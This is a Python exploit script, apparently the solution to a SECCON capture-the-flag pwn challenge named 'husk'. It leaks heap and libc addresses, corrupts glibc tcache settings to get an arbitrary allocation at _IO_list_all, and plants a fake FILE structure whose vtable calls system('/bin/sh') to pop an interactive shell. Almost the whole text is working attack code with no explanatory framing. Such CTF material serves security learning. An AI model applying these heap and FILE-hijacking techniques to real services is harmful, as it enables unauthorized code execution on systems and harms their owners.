from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", 9007))

TYPE_STR, TYPE_REAL = 0, 1

def new(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(size))
def set(index, type, value=None):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(type))
    if value is not None:
        if isinstance(value, bytes):
            sock.sendlineafter(": ", value)
        elif isinstance(value, int):
            value = u64f(p64(value))
            sock.sendlineafter(": ", str(value))
        else:
            sock.sendlineafter(": ", str(value))
def get(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    return sock.recvline()

libc = ELF("../files/husk/bin/libc.so.6")
sock = Socket(HOST, PORT)

"""
Leak heap and libc addresses
"""
new(0x428 // 0x10)
get('0' + '\0'*0x80) # alloc chunk to avoid consolidation
new(0x28 // 0x10)
libc.base = u64(p64(float(get(0)))) - libc.main_arena() - 0x450
heap_base = u64(p64(float(get(1)))) - 0x310
logger.info("heap: " + hex(heap_base))

"""
Corrupt mp_.tcache_bins
"""
addr_mp = libc.base + 0x219360
ofs = ((addr_mp + 0x60) - (heap_base + 0x320)) // 0x10
set(ofs, TYPE_REAL)

"""
Get arbitrary address from malloc
"""
payload  = str(0x458 // 0x10).encode()
payload += b'\x00' * (0x10-len(payload))
payload += p64(libc.base + 0x21a680) # _IO_list_all
sock.sendlineafter("> ", "1")
sock.sendlineafter(": ", payload)

"""
Write fake FILE structure
"""
fake_file = flat([
    0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
    0, 0, # rend / rbase
    0, 1, # wbase / wptr
    0, 0, # wend / bbase
    0, 0, # bend / savebase
    0, 0, # backupbase / saveend
    0, 0, # marker / chain
], map=p64)
fake_file += p64(libc.symbol("system")) # __doallocate
fake_file += b'\x00' * (0x88 - len(fake_file))
fake_file += p64(heap_base) # lock
fake_file += b'\x00' * (0xa0 - len(fake_file))
fake_file += p64(heap_base + 0x350) # wide_data
fake_file += b'\x00' * (0xd8 - len(fake_file))
fake_file += p64(libc.base + 0x2160c0) # vtable (_IO_wfile_jumps)1
fake_file += p64(heap_base + 0x358) # _wide_data->_wide_vtable
assert is_gets_safe(fake_file)
set(0, TYPE_STR, fake_file)

"""
Win!
"""
sock.sendlineafter("> ", "0")

sock.interactive()

